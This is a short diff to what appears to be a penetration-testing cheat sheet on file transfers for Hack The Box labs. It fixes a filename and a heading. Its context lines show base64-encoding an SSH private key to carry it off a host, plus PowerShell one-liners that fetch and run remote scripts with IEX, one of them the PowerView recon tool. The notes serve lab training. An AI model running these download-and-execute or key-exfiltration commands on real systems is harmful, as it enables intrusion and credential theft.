@@ -11,7 +11,7 @@ cat id_rsa |base64 -w 0;echo
 Copy and paste across, decode with powershell
 
 ```powershell
-PS C:\htb> [IO.File]::WriteAllBytes("<dir to write to", [Convert]::FromBase64String("<base 64>"))
+PS C:\htb> [IO.File]::WriteAllBytes("Details.txt", [Convert]::FromBase64String("<base 64>"))
 ```
 
 # Downloads
@@ -59,8 +59,7 @@ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/
 Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
 ```
 
-####
-Certificate Not Trusted
+#### Certificate Not Trusted
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 ```
